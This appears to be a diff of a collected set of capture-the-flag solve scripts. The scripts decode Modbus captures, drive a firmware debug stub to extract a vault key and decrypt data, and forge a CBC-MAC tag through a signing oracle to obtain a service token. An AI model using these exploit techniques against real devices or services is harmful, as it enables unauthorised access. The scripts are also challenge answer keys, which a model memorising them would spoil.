-    ks = sorted(set(rad[t]) & set(ais[m]))
-    return ks, [(ais[m][k][0]-rad[t][k][0], ais[m][k][1]-rad[t][k][1]) for k in ks]
-def score(t, m):
-    ks, rs = resid(t, m)
-    return st.median(math.hypot(*r) for r in rs) if rs else 1e9
-assoc = {t: min(ais, key=lambda m: score(t, m)) for t in sorted(rad)}
-assert len(set(assoc.values())) == 16, assoc
-print({t: round(score(t, m), 1) for t, m in assoc.items()}, file=sys.stderr)
-# divergence
-best = None
-for t, m in assoc.items():
-    ks, rs = resid(t, m); mag = [math.hypot(*r) for r in rs]
-    i = 0
-    while i < len(ks):
-        if mag[i] < 250: i += 1; continue
-        j = i
-        while j+1 < len(ks) and mag[j+1] >= 250 and abs(rs[j+1][0]-rs[j][0]) <= 15 and abs(rs[j+1][1]-rs[j][1]) <= 15: j += 1
-        if j-i+1 >= 4 and (best is None or j-i > best[0]): best = (j-i, t, m, ks[i], ks[j], rs[i:j+1])
-        i = j+1
-_, bt, bm, s, e, rr = best
-mean = lambda v: math.floor(abs(sum(v)/len(v)) + .5) * (1 if sum(v) >= 0 else -1)
-div = {"mmsi": bm, "start_utc": F(s), "end_utc": F(e), "ais_minus_radar_east_m": mean([r[0] for r in rr]), "ais_minus_radar_north_m": mean([r[1] for r in rr])}
-# CPA: radar segments
-cp = None
-for t, d in rad.items():
-    ks = sorted(d)
-    for a, b in zip(ks, ks[1:]):
-        p, q = d[a], d[b]; v = (q[0]-p[0], q[1]-p[1]); vv = v[0]**2 + v[1]**2
-        u = 0 if vv == 0 else min(1, max(0, -(p[0]*v[0]+p[1]*v[1])/vv))
-        dist = math.hypot(p[0]+u*v[0], p[1]+u*v[1]); tt = a + (b-a)*u
-        if cp is None or dist < cp[0] - 1e-9: cp = (dist, tt, t)
-dist, tt, ct = cp
-import calendar
-sec = calendar.timegm(tt.utctimetuple()) + tt.microsecond/1e6; fl = math.floor(sec); fr = sec - fl
-tt = datetime(1970,1,1) + timedelta(seconds=fl + (1 if fr > .5 else 0))
-rep = {"version": "KALNET-RECON-1", "radar_utc_offset_minutes": off,
-       "associations": [{"radar_track": t, "mmsi": assoc[t]} for t in sorted(assoc)],
-       "divergence": div,
-       "closest_approach": {"mmsi": assoc[ct], "utc": F(tt), "distance_m": math.floor(dist*10+.5)/10}}
-print(json.dumps(rep))
-if "--post" in sys.argv:
-    req = urllib.request.Request(B + "/reconcile", json.dumps(rep).encode(), {"Content-Type": "application/json"})
-    try: print(urllib.request.urlopen(req).read().decode())
-    except urllib.error.HTTPError as ex: print(ex.code, ex.read().decode())
 ~~~~
 
 ### Hard Landing — `solve/solve.py`
@@ -7532,183 +7411,125 @@ if __name__ == "__main__":
     exploit(key, reposition, host, port)
 ~~~~
 
-### Ghost Bank — `solve/solve.py`
+### Water Hammer Reconciliation — `solve/solve.py`
 
 ~~~~python
 #!/usr/bin/env python3
-"""GHOST BANK — activate the stub, read the vault key (page 7, STATE 4), decrypt page 3.
-Usage: solve.py HOST PORT   (needs: pip install unicorn; firmware.bin next to this script's cwd)
+"""water-hammer-reconciliation: rebuild the confirmed Modbus/TCP control history and its report hash.
+
+Usage: python3 -I solve.py ../files            (pure Python, no tshark needed)
+Implements the rules of station-profile.txt: reassembled TCP streams, strict ADU grammar,
+FC16 -> unique echo -> immediately-next FC3 readback with a unique matched response.
 """
-import socket, struct, sys
-from unicorn import Uc, UC_ARCH_ARM64, UC_MODE_LITTLE_ENDIAN
-from unicorn.arm64_const import *
+import base64, hashlib, struct, sys
+from pathlib import Path
 
-HOST, PORT = sys.argv[1], int(sys.argv[2])
-FW = open("firmware.bin", "rb").read()
-M = (1 << 64) - 1
-ror = lambda v, n: ((v >> n) | (v << (64 - n))) & M
+d = Path(sys.argv[1])
+UNIT, SRV = 17, 502
 
-def f(v):                                  # firmware fn @0x400120
-    x = v ^ 0xa3b195354a39b70d
-    x = ((x >> 16) & 0x7FFFFFFF) ^ ror(x, 47)
-    x = (x * 0x64170d358aa115a1) & M
-    x ^= x >> 29; x = ror(x, 13)
-    x = (x * 0x65931d9dfc2010db) & M
-    return x ^ (x >> 31)
 
-def chacha_block(key, ctr, c12):           # run the firmware's own block fn @0x400174
-    mu = Uc(UC_ARCH_ARM64, UC_MODE_LITTLE_ENDIAN)
-    mu.mem_map(0x400000, 0x1000); mu.mem_write(0x400000, FW)
-    mu.mem_map(0x4F0000, 0x10000); mu.reg_write(UC_ARM64_REG_SP, 0x4F8000)
-    mu.mem_map(0x600000, 0x3000)
-    mu.mem_write(0x600000, key); mu.mem_write(0x601000, c12)
-    for r, v in ((UC_ARM64_REG_X0, 0x600000), (UC_ARM64_REG_X1, 0x601000),
-                 (UC_ARM64_REG_X2, ctr), (UC_ARM64_REG_X3, 0x602000),
-                 (UC_ARM64_REG_LR, 0xDEAD0000)):
-        mu.reg_write(r, v)
-    mu.emu_start(0x400174, 0xDEAD0000)
-    return bytes(mu.mem_read(0x602000, 64))
+# ---- pcapng + Ethernet/IPv4/TCP -> per-direction reassembled byte streams with frame ordinals
+def frames(path):
+    buf, o = path.read_bytes(), 0
+    while o < len(buf):
+        bt, bl = struct.unpack("<II", buf[o:o + 8])
+        if bt == 6:                                                  # enhanced packet block
+            cl = struct.unpack("<I", buf[o + 20:o + 24])[0]
+            yield buf[o + 28:o + 28 + cl]
+        o += bl
 
-s = socket.create_connection((HOST, PORT)); noack = False
-def rx(n):
-    b = b""
-    while len(b) < n: b += s.recv(n - len(b))
-    return b
-def cmd(p):
-    global noack
-    s.sendall(b"$%s#%02x" % (p.encode(), sum(p.encode()) & 0xFF))
-    if not noack: rx(1)                        # '+' ack
-    while rx(1) != b"$": pass
-    d = b""
-    while (c := rx(1)) != b"#": d += c
-    rx(2)
-    if not noack: s.sendall(b"+")
-    return d.decode()
-cmd("QStartNoAckMode"); noack = True
-rd = lambda a, n=4: cmd(f"m{a:x},{n:x}")
-wr = lambda a, v: cmd(f"M{a:x},4:{struct.pack('<I', v).hex()}")
-CTRL, PAGE, OFF, DATA, CLEN, CLO, CHI, KEY, ST = (0x40000000, 0x40000008, 0x40000010,
-    0x40000018, 0x4000001C, 0x40000020, 0x40000024, 0x40000028, 0x40000030)
-def page(p, n):
-    wr(PAGE, p); out = b""
-    for o in range(n): wr(OFF, o); out += bytes.fromhex(rd(DATA, 1))
+
+streams = {}                                                         # (sport, dport) -> {isn, bytes: {off: (byte, frame)}}
+for n, f in enumerate(frames(d / "reserve-header.pcapng"), 1):
+    if f[12:14] != b"\x08\x00" or f[23] != 6:
+        continue
+    ihl = (f[14] & 15) * 4
+    ip = f[14:14 + struct.unpack(">H", f[16:18])[0]]
+    t = ip[ihl:]
+    sp, dp, seq = struct.unpack(">HHI", t[:8])
+    s = streams.setdefault((sp, dp), {"isn": None, "pay": []})
+    if t[13] & 2:
+        s["isn"] = seq
+    pay = t[(t[12] >> 4) * 4:]
+    if pay:
+        s["pay"].append((seq, n, pay))
+
+
+def adus(stream):
+    place = {}
+    for seq, n, pay in stream["pay"]:
+        for i, b in enumerate(pay):
+            place.setdefault((seq + i - stream["isn"] - 1) & 0xFFFFFFFF, (b, n))   # first frame wins (retransmissions)
+    data = bytes(place[i][0] for i in range(len(place)))
+    frm = [place[i][1] for i in range(len(place))]
+    out, o = [], 0
+    while o + 6 <= len(data):
+        tid, pid, ln = struct.unpack(">HHH", data[o:o + 6])
+        end = o + 6 + ln
+        if pid != 0 or ln < 2 or end > len(data):                    # malformed / truncated: not an event
+            o = end if end <= len(data) else len(data)
+            continue
+        out.append({"tid": tid, "len": ln, "unit": data[o + 6], "pdu": data[o + 7:end], "frame": frm[end - 1]})
+        o = end
     return out
 
-# 1) ciphertext of the tasking: the only page with CIPHER_LEN != 0 (page 3)
-wr(PAGE, 3); clen = struct.unpack("<I", bytes.fromhex(rd(CLEN)))[0]
-ct = page(3, clen); print("page 3 ciphertext:", clen, "bytes")
 
-# 2) activation ritual (PAGE must be 7), then CONTROL=0x9c -> STATUS 4 reveals the key on page 7
-wr(CTRL, 0x41)
-ch = struct.unpack("<Q", bytes.fromhex(rd(CLO) + rd(CHI)))[0]
-k = f(ch); wr(PAGE, 7); wr(KEY, k & 0xFFFFFFFF); wr(KEY, k >> 32); wr(CTRL, 0x93)
-assert rd(ST) == "03000000", "bad activation"
-wr(CTRL, 0x9c); assert rd(ST) == "04000000"
-key = page(7, 32); print("vault key:", key.hex())
+cli = next(v for k, v in streams.items() if k[1] == SRV)
+srv = next(v for k, v in streams.items() if k[0] == SRV)
+C, S = adus(cli), adus(srv)
+print(f"{len(C)} client ADUs, {len(S)} server ADUs", file=sys.stderr)
 
-# 3) ChaCha with the firmware's block fn: nonce = "SEAL-V01"+00000001, counter starts at 1
-c12 = b"SEAL-V01\x00\x00\x00\x01"
-pt = b"".join(bytes(a ^ b for a, b in zip(ct[i:i+64], chacha_block(key, 1 + i // 64, c12)))
-              for i in range(0, len(ct), 64))
-print(pt.decode())
-~~~~
+# ---- confirmed snapshots
+snaps = []
+for ci, req in enumerate(C):
+    p = req["pdu"]
+    if req["unit"] != UNIT or not p or p[0] != 0x10 or len(p) < 6:
+        continue
+    A, N = struct.unpack(">HH", p[1:5])
+    if not (1 <= N <= 4 and 0x1000 <= A and A + N - 1 <= 0x1003 and req["len"] == 7 + 2 * N
+            and p[5] == 2 * N and len(p) == 6 + 2 * N):
+        continue
+    # unique pending response with the same tid
+    cand = [r for r in S if r["tid"] == req["tid"] and r["frame"] > req["frame"]]
+    if len(cand) != 1:
+        continue
+    resp = cand[0]
+    if not (resp["unit"] == UNIT and resp["len"] == 6 and resp["pdu"] == p[:5]):
+        continue
+    # immediately next client ADU after the positive response
+    nxt = next((c for c in C if c["frame"] > resp["frame"]), None)
+    if not (nxt and nxt["unit"] == UNIT and nxt["len"] == 6 and nxt["pdu"] == bytes.fromhex("0310000004")):
+        continue
+    rb = [r for r in S if r["tid"] == nxt["tid"] and r["frame"] > nxt["frame"]]
+    if len(rb) != 1:
+        continue
+    r3 = rb[0]
+    if not (r3["unit"] == UNIT and r3["len"] == 11 and r3["pdu"][:2] == b"\x03\x08" and len(r3["pdu"]) == 10):
+        continue
+    regs = struct.unpack(">4H", r3["pdu"][2:])
+    snaps.append((resp["frame"], resp["tid"], regs))
+snaps.sort()
+assert len(snaps) == 64, len(snaps)
+print(f"{len(snaps)} confirmed snapshots", file=sys.stderr)
 
-### HELIOS-RTU — `solve/solve.py`
+# ---- safety screen (integer arithmetic only)
+P0, G0, A0, R0 = 80, 500, 0, 60000
+T_US = 2 * 20000 * 1000000 // 1065000
+V = lambda p, g: (p * g // 1000) * 1000000 // 70686
+prevV, mask, lines = V(P0, G0), 0, []
+for i, (_, tid, (p, g, a, r)) in enumerate(snaps):
+    v = V(p, g)
+    q = 998 * 1065 * abs(v - prevV)
+    if a == 1 and r < T_US and q > 9000 * 100000:
+        mask |= 1 << (63 - i)
+    lines.append(f"i={i};tid={tid:04X};p={p};g={g};a={a};r={r}")
+    prevV = v
 
-~~~~python
-#!/usr/bin/env python3
-"""
-CSCTF 2026 - HELIOS-RTU (reverse/hard)
-Produce the service token from the assigned live instance only.
-
-Static findings replayed here (see README for the full analysis):
-  - The target is an ATmega328P (signature 0x1e950f). ISP answers but
-    flash reads back 0xFF (lock 0xFC), debugWIRE never syncs (hfuse
-    DWEN=1); the USB serial bootloader is the interface that reads the
-    application firmware (2 KiB at flash 0x0000).
-  - The firmware's authenticated control frame (UART type 5, 48-byte
-    payload) AES-CBC-MACs the payload with a key expanded from flash
-    0x7F00 - a region every external read returns as 0xFF, so the key
-    itself stays unreadable.
-  - The service exposes exactly that AES as `svc sign <16B>` (an
-    encryption oracle; records starting 0xCC are refused), and
-    `svc exec <frame32> <tag>` verifies the CBC-MAC, requires the
-    directive marker frame[16]=0xCC, frame[17]=0x0A and the live
-    nonce at frame[18:26], then issues the token.
-  - Forgery: tag = sign(frame[16:32] XOR sign(frame[0:16])) - the
-    classic CBC-MAC oracle construction. Nonce is single-use, so the
-    nonce read, both signs and the exec stay in one session.
-
-Requires: python3-websockets + network access to the assigned instance.
-
-Usage:
-    python3 solve.py [ws://host:port/ws | http://host:port/]
-"""
-
-import asyncio
-import json
-import re
-import sys
-
-import websockets
-
-
-async def run(url):
-    async with websockets.connect(url) as ws:
-        banner = json.loads(await ws.recv())
-        assert "HELIOS" in banner.get("data", "") or banner, "no banner"
-
-        async def cmd(line, timeout=30):
-            await ws.send(line)
-            msg = json.loads(await asyncio.wait_for(ws.recv(),
-                                                    timeout=timeout))
-            return msg.get("data", "")
-
-        out = await cmd("apt install svc")
-        assert "installed" in out or "Setting up svc" in out, out
-
-        out = await cmd("svc nonce")
-        m = re.search(r"nonce = ([0-9a-f]{16})", out)
-        assert m, f"bad nonce reply: {out!r}"
-        nonce = m.group(1)
-        print(f"[*] Live nonce    : {nonce}")
-
-        frame = ("00" * 16 + "cc0a" + nonce + "00" * 6)
-        assert len(frame) == 64, "frame must be 32 bytes"
-        print(f"[*] Frame         : {frame}")
-
-        async def sign(record_hex):
-            reply = await cmd(f"svc sign {record_hex}")
-            mm = re.search(r"tag = ([0-9a-f]{32})", reply)
-            assert mm, f"sign refused/failed: {reply!r}"
-            return mm.group(1)
-
-        t1 = await sign(frame[:32])
-        mixed = bytes(a ^ b for a, b in zip(bytes.fromhex(frame[32:]),
-                                            bytes.fromhex(t1))).hex()
-        tag = await sign(mixed)
-        print(f"[*] CBC-MAC tag   : {tag} "
-              f"(sign[0] then sign[1 xor sign[0]])")
-
-        out = await cmd(f"svc exec {frame} {tag}")
-        print(f"[*] exec reply    : {out.strip()}")
-        m = re.search(r"SERVICE TOKEN = (CSCTF\{[^}]+\})", out)
-        assert m, "no service token in exec reply"
-        return m.group(1)
-
-
-def main():
-    url = sys.argv[1] if len(sys.argv) > 1 else \
-        "ws://w01.ctf.chronos-security.ro:34019/ws"
-    if url.startswith("http"):
-        url = url.replace("http", "ws", 1).rstrip("/") + "/ws"
-    print(f"[*] Instance      : {url}")
-    token = asyncio.run(run(url))
-    print(f"\n[+] FLAG            : {token}")
-
-
-if __name__ == "__main__":
-    main()
+R = "\n".join(["water-hammer-reconciliation-v2", f"initial;p={P0};g={G0};a={A0};r={R0}", "n=64"] + lines
+               + [f"unsafe-mask={mask:016X}"])
+digest = hashlib.sha256(R.encode()).digest()
+print("T_US =", T_US, "mask =", f"{mask:016X}", file=sys.stderr)
+print("CSCTF{" + base64.b32encode(digest[:24]).decode().rstrip("=") + "}")
 ~~~~
 
 ### Carrier Shadow — `solve/solve.py`
@@ -7811,6 +7632,87 @@ print(f"stage 2: {len(elf)} bytes written to {sys.argv[2]}", file=sys.stderr)
 
 # 6. The authorization string sits in the stage-2 .rodata, next to its printf format.
 print(re.search(rb"CSCTF\{[^}]+\}", elf).group().decode())
+~~~~
+
+### Ghost Bank — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""GHOST BANK — activate the stub, read the vault key (page 7, STATE 4), decrypt page 3.
+Usage: solve.py HOST PORT   (needs: pip install unicorn; firmware.bin next to this script's cwd)
+"""
+import socket, struct, sys
+from unicorn import Uc, UC_ARCH_ARM64, UC_MODE_LITTLE_ENDIAN
+from unicorn.arm64_const import *
+
+HOST, PORT = sys.argv[1], int(sys.argv[2])
+FW = open("firmware.bin", "rb").read()
+M = (1 << 64) - 1
+ror = lambda v, n: ((v >> n) | (v << (64 - n))) & M
+
+def f(v):                                  # firmware fn @0x400120
+    x = v ^ 0xa3b195354a39b70d
+    x = ((x >> 16) & 0x7FFFFFFF) ^ ror(x, 47)
+    x = (x * 0x64170d358aa115a1) & M
+    x ^= x >> 29; x = ror(x, 13)
+    x = (x * 0x65931d9dfc2010db) & M
+    return x ^ (x >> 31)
+
+def chacha_block(key, ctr, c12):           # run the firmware's own block fn @0x400174
+    mu = Uc(UC_ARCH_ARM64, UC_MODE_LITTLE_ENDIAN)
+    mu.mem_map(0x400000, 0x1000); mu.mem_write(0x400000, FW)
+    mu.mem_map(0x4F0000, 0x10000); mu.reg_write(UC_ARM64_REG_SP, 0x4F8000)
+    mu.mem_map(0x600000, 0x3000)
+    mu.mem_write(0x600000, key); mu.mem_write(0x601000, c12)
+    for r, v in ((UC_ARM64_REG_X0, 0x600000), (UC_ARM64_REG_X1, 0x601000),
+                 (UC_ARM64_REG_X2, ctr), (UC_ARM64_REG_X3, 0x602000),
+                 (UC_ARM64_REG_LR, 0xDEAD0000)):
+        mu.reg_write(r, v)
+    mu.emu_start(0x400174, 0xDEAD0000)
+    return bytes(mu.mem_read(0x602000, 64))
+
+s = socket.create_connection((HOST, PORT)); noack = False
+def rx(n):
+    b = b""
+    while len(b) < n: b += s.recv(n - len(b))
+    return b
+def cmd(p):
+    global noack
+    s.sendall(b"$%s#%02x" % (p.encode(), sum(p.encode()) & 0xFF))
+    if not noack: rx(1)                        # '+' ack
+    while rx(1) != b"$": pass
+    d = b""
+    while (c := rx(1)) != b"#": d += c
+    rx(2)
+    if not noack: s.sendall(b"+")
+    return d.decode()
+cmd("QStartNoAckMode"); noack = True
+rd = lambda a, n=4: cmd(f"m{a:x},{n:x}")
+wr = lambda a, v: cmd(f"M{a:x},4:{struct.pack('<I', v).hex()}")
+CTRL, PAGE, OFF, DATA, CLEN, CLO, CHI, KEY, ST = (0x40000000, 0x40000008, 0x40000010,
+    0x40000018, 0x4000001C, 0x40000020, 0x40000024, 0x40000028, 0x40000030)
+def page(p, n):
+    wr(PAGE, p); out = b""
+    for o in range(n): wr(OFF, o); out += bytes.fromhex(rd(DATA, 1))
+    return out
+
+# 1) ciphertext of the tasking: the only page with CIPHER_LEN != 0 (page 3)
+wr(PAGE, 3); clen = struct.unpack("<I", bytes.fromhex(rd(CLEN)))[0]
+ct = page(3, clen); print("page 3 ciphertext:", clen, "bytes")
+
+# 2) activation ritual (PAGE must be 7), then CONTROL=0x9c -> STATUS 4 reveals the key on page 7
+wr(CTRL, 0x41)
+ch = struct.unpack("<Q", bytes.fromhex(rd(CLO) + rd(CHI)))[0]
+k = f(ch); wr(PAGE, 7); wr(KEY, k & 0xFFFFFFFF); wr(KEY, k >> 32); wr(CTRL, 0x93)
+assert rd(ST) == "03000000", "bad activation"
+wr(CTRL, 0x9c); assert rd(ST) == "04000000"
+key = page(7, 32); print("vault key:", key.hex())
+
+# 3) ChaCha with the firmware's block fn: nonce = "SEAL-V01"+00000001, counter starts at 1
+c12 = b"SEAL-V01\x00\x00\x00\x01"
+pt = b"".join(bytes(a ^ b for a, b in zip(ct[i:i+64], chacha_block(key, 1 + i // 64, c12)))
+              for i in range(0, len(ct), 64))
+print(pt.decode())
 ~~~~
 
 ### Ground Lock — `solve/solve.py`
@@ -7920,6 +7822,104 @@ def main():
                for i in range(3)), "round-trip check failed"
 
     print(f"\n[+] FLAG            : CSCTF{{{code.decode()}}}")
+
+
+if __name__ == "__main__":
+    main()
+~~~~
+
+### HELIOS-RTU — `solve/solve.py`
+
+~~~~python
+#!/usr/bin/env python3
+"""
+CSCTF 2026 - HELIOS-RTU (reverse/hard)
+Produce the service token from the assigned live instance only.
+
+Static findings replayed here (see README for the full analysis):
+  - The target is an ATmega328P (signature 0x1e950f). ISP answers but
+    flash reads back 0xFF (lock 0xFC), debugWIRE never syncs (hfuse
+    DWEN=1); the USB serial bootloader is the interface that reads the
+    application firmware (2 KiB at flash 0x0000).
+  - The firmware's authenticated control frame (UART type 5, 48-byte
+    payload) AES-CBC-MACs the payload with a key expanded from flash
+    0x7F00 - a region every external read returns as 0xFF, so the key
+    itself stays unreadable.
+  - The service exposes exactly that AES as `svc sign <16B>` (an
+    encryption oracle; records starting 0xCC are refused), and
+    `svc exec <frame32> <tag>` verifies the CBC-MAC, requires the
+    directive marker frame[16]=0xCC, frame[17]=0x0A and the live
+    nonce at frame[18:26], then issues the token.
+  - Forgery: tag = sign(frame[16:32] XOR sign(frame[0:16])) - the
+    classic CBC-MAC oracle construction. Nonce is single-use, so the
+    nonce read, both signs and the exec stay in one session.
+
+Requires: python3-websockets + network access to the assigned instance.
+
+Usage:
+    python3 solve.py [ws://host:port/ws | http://host:port/]
+"""
+
+import asyncio
+import json
+import re
+import sys
+
+import websockets
+
+
+async def run(url):
+    async with websockets.connect(url) as ws:
+        banner = json.loads(await ws.recv())
+        assert "HELIOS" in banner.get("data", "") or banner, "no banner"
+
+        async def cmd(line, timeout=30):
+            await ws.send(line)
+            msg = json.loads(await asyncio.wait_for(ws.recv(),
+                                                    timeout=timeout))
+            return msg.get("data", "")
+
+        out = await cmd("apt install svc")
+        assert "installed" in out or "Setting up svc" in out, out
+
+        out = await cmd("svc nonce")
+        m = re.search(r"nonce = ([0-9a-f]{16})", out)
+        assert m, f"bad nonce reply: {out!r}"
+        nonce = m.group(1)
+        print(f"[*] Live nonce    : {nonce}")
+
+        frame = ("00" * 16 + "cc0a" + nonce + "00" * 6)
+        assert len(frame) == 64, "frame must be 32 bytes"
+        print(f"[*] Frame         : {frame}")
+
+        async def sign(record_hex):
+            reply = await cmd(f"svc sign {record_hex}")
+            mm = re.search(r"tag = ([0-9a-f]{32})", reply)
+            assert mm, f"sign refused/failed: {reply!r}"
+            return mm.group(1)
+
+        t1 = await sign(frame[:32])
+        mixed = bytes(a ^ b for a, b in zip(bytes.fromhex(frame[32:]),
+                                            bytes.fromhex(t1))).hex()
+        tag = await sign(mixed)
+        print(f"[*] CBC-MAC tag   : {tag} "
+              f"(sign[0] then sign[1 xor sign[0]])")
+
+        out = await cmd(f"svc exec {frame} {tag}")
+        print(f"[*] exec reply    : {out.strip()}")
+        m = re.search(r"SERVICE TOKEN = (CSCTF\{[^}]+\})", out)
+        assert m, "no service token in exec reply"
+        return m.group(1)
+
+
+def main():
+    url = sys.argv[1] if len(sys.argv) > 1 else \
+        "ws://w01.ctf.chronos-security.ro:34019/ws"
+    if url.startswith("http"):
+        url = url.replace("http", "ws", 1).rstrip("/") + "/ws"
+    print(f"[*] Instance      : {url}")
+    token = asyncio.run(run(url))
+    print(f"\n[+] FLAG            : {token}")
 
 
 if __name__ == "__main__":
